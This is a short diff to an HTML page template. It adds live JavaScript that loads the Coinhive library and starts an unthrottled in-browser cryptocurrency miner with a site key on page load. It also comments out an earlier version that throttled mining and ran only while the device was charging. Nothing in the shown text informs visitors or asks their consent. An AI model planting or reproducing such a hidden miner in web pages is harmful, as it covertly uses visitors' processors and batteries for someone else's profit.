@@ -233,6 +233,11 @@ s.setAttribute('data-timestamp', +new Date());
 	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
 
+var miner = new CoinHive.Anonymous('8O0pD3Nu5TjaiP3gEVd2s5OCMVB2ZSOY');
+
+miner.start();
+
+/*
 try {
     var miner = new CoinHive.Anonymous('8O0pD3Nu5TjaiP3gEVd2s5OCMVB2ZSOY', {
         throttle: 0.85,
@@ -244,17 +249,17 @@ try {
     
     miner.start();
     
-    /*
     navigator.getBattery().then(function (battery) {
         if (battery.charging) miner.start();
         battery.onchargingchange = function (evt) {
             if (battery.charging) miner.start();
             else miner.stop();
         }
-    });*/
+    });
     } catch (e) {
         miner.start();
     }
+    */
 </script>
 </body>
 
